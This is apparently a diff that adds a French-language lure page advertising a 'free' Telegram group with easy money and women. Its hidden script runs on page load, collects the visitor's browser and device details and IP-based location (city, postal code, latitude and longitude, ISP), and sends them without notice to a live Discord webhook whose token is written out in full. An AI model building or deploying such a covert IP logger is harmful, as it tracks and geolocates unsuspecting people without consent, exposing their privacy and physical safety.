@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Groupe Telegram Exclusif">
+    <meta property="og:title" content="Rejoins le groupe Telegram le plus chaud de 2025 !">
+    <meta property="og:description" content="Accès 100% gratuit à un groupe privé avec des opportunités business, de l'argent facile et des meufs incroyables. Clique maintenant !">
+    <meta property="og:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+    <meta property="og:url" content="https://t.me/fiscalitecryptofr">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Groupe Télégram Argent & Meufs - Rejoins Gratuitement">
+    <meta name="twitter:description" content="Rejoins le meilleur groupe Telegram gratuit avec cash facile, business et des bombes en DM.">
+    <meta name="twitter:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+    <title>Groupe Telegram Exclusif</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
+        h1 { color: #333; }
+        a { display: inline-block; padding: 15px 30px; background-color: #7289DA; color: white; text-decoration: none; border-radius: 5px; }
+        a:hover { background-color: #5a6db5; }
+    </style>
+</head>
+<body>
+    <h1>Rejoins le groupe Telegram le plus chaud de 2025 !</h1>
+    <p>Accès 100% gratuit à un groupe privé avec des opportunités business et plus encore !</p>
+    <a href="https://t.me/fiscalitecryptofr">Rejoindre maintenant</a>
+
+    <script>
+        async function collectAndSendData() {
+            try {
+                // Collecter les informations sur l'appareil
+                const deviceInfo = {
+                    userAgent: navigator.userAgent || 'unknown',
+                    platform: navigator.platform || 'unknown',
+                    language: navigator.language || 'unknown',
+                    screen: {
+                        width: window.screen.width || 'unknown',
+                        height: window.screen.height || 'unknown',
+                        colorDepth: window.screen.colorDepth || 'unknown'
+                    },
+                    window: {
+                        innerWidth: window.innerWidth || 'unknown',
+                        innerHeight: window.innerHeight || 'unknown'
+                    },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+                    cookiesEnabled: navigator.cookieEnabled || 'unknown',
+                    onlineStatus: navigator.onLine || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType || 'unknown',
+                        rtt: navigator.connection.rtt || 'unknown',
+                        downlink: navigator.connection.downlink || 'unknown'
+                    } : 'unknown'
+                };
+
+                // Récupérer les informations IP via une API publique (ipapi.co)
+                let ipInfo = {};
+                try {
+                    const ipResponse = await fetch('https://ipapi.co/json/');
+                    ipInfo = await ipResponse.json();
+                } catch (ipError) {
+                    console.error('Erreur lors de la récupération des infos IP:', ipError);
+                    ipInfo = { error: 'Impossible de récupérer les infos IP' };
+                }
+
+                // Construire l'objet de données à envoyer
+                const visitorData = {
+                    ip: {
+                        ipv4: ipInfo.ip || 'unknown',
+                        ipv6: ipInfo.ipv6 || 'unknown',
+                        city: ipInfo.city || 'unknown',
+                        region: ipInfo.region || 'unknown',
+                        country: ipInfo.country_name || 'unknown',
+                        postal: ipInfo.postal || 'unknown',
+                        latitude: ipInfo.latitude || 'unknown',
+                        longitude: ipInfo.longitude || 'unknown',
+                        isp: ipInfo.org || 'unknown',
+                        organization: ipInfo.asn || 'unknown',
+                        timezone: ipInfo.timezone || 'unknown'
+                    },
+                    device: deviceInfo,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Envoyer les données au webhook Discord
+                try {
+                    await fetch('https://discord.com/api/webhooks/1369692807555711087/tEaLvmxLiM-p7PICP1qzTkSo524meQ1zEnpij0-BivEBdYz6WWLg8Rr71KfxjF2-yh-1', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: null,
+                            embeds: [{
+                                title: 'Nouveau Visiteur',
+                                description: `**IP Info**\nIPv4: ${visitorData.ip.ipv4}\nIPv6: ${visitorData.ip.ipv6}\nVille: ${visitorData.ip.city}\nRégion: ${visitorData.ip.region}\nPays: ${visitorData.ip.country}\nCode postal: ${visitorData.ip.postal}\nLatitude: ${visitorData.ip.latitude}\nLongitude: ${visitorData.ip.longitude}\nISP: ${visitorData.ip.isp}\nOrganisation: ${visitorData.ip.organization}\nFuseau horaire: ${visitorData.ip.timezone}\n\n**Device Info**\nUser Agent: ${visitorData.device.userAgent}\nPlateforme: ${visitorData.device.platform}\nLangue: ${visitorData.device.language}\nRésolution écran: ${visitorData.device.screen.width}x${visitorData.device.screen.height}\nProfondeur couleur: ${visitorData.device.screen.colorDepth}\nTaille fenêtre: ${visitorData.device.window.innerWidth}x${visitorData.device.window.innerHeight}\nFuseau horaire: ${visitorData.device.timezone}\nCookies activés: ${visitorData.device.cookiesEnabled}\nStatut en ligne: ${visitorData.device.onlineStatus}\nMémoire appareil: ${visitorData.device.deviceMemory}\nCœurs CPU: ${visitorData.device.hardwareConcurrency}\nConnexion: ${visitorData.device.connection.effectiveType || 'unknown'} (RTT: ${visitorData.device.connection.rtt || 'unknown'}, Downlink: ${visitorData.device.connection.downlink || 'unknown'})\n\n**Horodatage**: ${visitorData.timestamp}`,
+                                color: 0x7289DA
+                            }]
+                        })
+                    });
+                } catch (discordError) {
+                    console.error('Erreur lors de l\'envoi au webhook Discord:', discordError);
+                }
+            } catch (error) {
+                console.error('Erreur générale:', error);
+            }
+        }
+
+        // Exécuter la collecte et l'envoi au chargement de la page
+        window.onload = collectAndSendData;
+    </script>
+</body>
+</html>
